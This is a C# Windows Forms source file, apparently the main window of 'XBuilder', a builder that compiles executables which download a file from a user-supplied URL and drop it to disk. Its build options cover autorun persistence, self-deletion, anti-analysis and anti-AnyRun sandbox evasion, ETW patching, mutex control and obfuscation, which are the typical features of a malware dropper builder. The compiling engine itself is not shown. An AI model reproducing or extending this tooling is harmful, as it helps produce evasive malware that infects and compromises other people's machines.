using System;
using System.IO;
using System.Windows.Forms;
using XBuilder.XCode;
using XBuilder.XForms;

namespace XBuilder
{
    public partial class XMain : Form
    {
        public XMain()
        {
            InitializeComponent();
        }

        private void BuildBtn_Click(object sender, EventArgs e)
        {
            bool
                UseProtectFunctions = ProtectEnable_Chk.Checked,
                Autorun = Autorun_Chk.Checked,
                SelfDelete = SelfDelete_Chk.Checked,
                AntiAnalysis = AntiAnalysis_Chk.Checked,
                AntiAnyRun = AntiAnyRun_Chk.Checked,
                MutexControl = MutexControl_Chk.Checked,
                ETWPatch = PatchETW_Chk.Checked,
                Obfuscate = Obfuscate_Chk.Checked;

            string
                Url = UrlFile_Box.Text,
                PathToDrop = PathToDropFile.Text,
                FileName = FileNameBox.Text,
                MutexValue = MutexControl ? MutexValue_Box.Text : null;


            if (string.IsNullOrEmpty(Url) || (MutexControl && string.IsNullOrEmpty(MutexValue)) || string.IsNullOrEmpty(PathToDrop) || string.IsNullOrEmpty(FileName))
            {
                MessageBox.Show("Boxes cannot be empty!", "~ Err Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            if (!HasHttpPrefix(Url))
            {
                MessageBox.Show("You need a write http/s prefix before the start of the link!\nExample: http://example.com/File.exe", "= Forms Helper =", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            if (!Path.HasExtension(FileName) || Path.GetExtension(FileName).ToLower() != ".exe")
            {
                FileName += ".exe";
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save your compiled file!";
                save.Filter = "EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        BuildEngine.Compilate(
                        Url, FileName, PathToDrop, save.FileName,
                        Autorun, SelfDelete, AntiAnalysis, AntiAnyRun, MutexControl, MutexValue, Obfuscate, ETWPatch, UseProtectFunctions);

                        MessageBox.Show($"Build successfully!\nBuild-File: {Path.GetFileName(save.FileName)}", "~ Build Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    } 

                    catch(Exception ex)
                    {
                        MessageBox.Show($"Build-Error: {ex}\nCheck -> compilation_errors.txt", "~ Error Information", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }
            } 
        }

        private void ProtectEnable_Chk_CheckedChanged(object sender, EventArgs e)
        {
            if (ProtectEnable_Chk.Checked)
            {
                Autorun_Chk.Enabled = true;
                SelfDelete_Chk.Enabled = true;
                AntiAnalysis_Chk.Enabled = true;
                AntiAnyRun_Chk.Enabled = true;
                MutexControl_Chk.Enabled = true;
                PatchETW_Chk.Enabled = true;
            }
            else
            {
                Autorun_Chk.Checked = false;
                Autorun_Chk.Enabled = false;

                SelfDelete_Chk.Checked = false;
                SelfDelete_Chk.Enabled = false;

                AntiAnalysis_Chk.Checked = false;
                AntiAnalysis_Chk.Enabled = false;

                AntiAnyRun_Chk.Checked = false;
                AntiAnyRun_Chk.Enabled = false;

                MutexControl_Chk.Checked = false;
                MutexControl_Chk.Enabled = false;

                PatchETW_Chk.Checked = false;
                PatchETW_Chk.Enabled = false;
            }
        }

        private void MutexControl_Chk_CheckedChanged(object sender, EventArgs e)
        {
            if (MutexValue_Box.Enabled)
            {
                MutexValue_Box.Clear();
                MutexValue_Box.Enabled = false;
            } else
            {
                MutexValue_Box.Enabled = true;
            }
        }
        private void MutexGenBtn_Click(object sender, EventArgs e)
        {
            if (ProtectEnable_Chk.Checked && MutexControl_Chk.Checked)
            {
                MutexValue_Box.Text = ObfuscateEngine.RandomUtils.RandomString(20);
            }
            else
            {
                MessageBox.Show("Please enable Protect-Functions and Mutex-Control functions!", "= Information =", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }
        private static bool HasHttpPrefix(string url)
        {
            return url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                   url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        }

        private void AboutOpenEvent_Click(object sender, EventArgs e)
        {
            XAbout AboutForm = new XAbout();
            AboutForm.ShowDialog();
        }
    }
}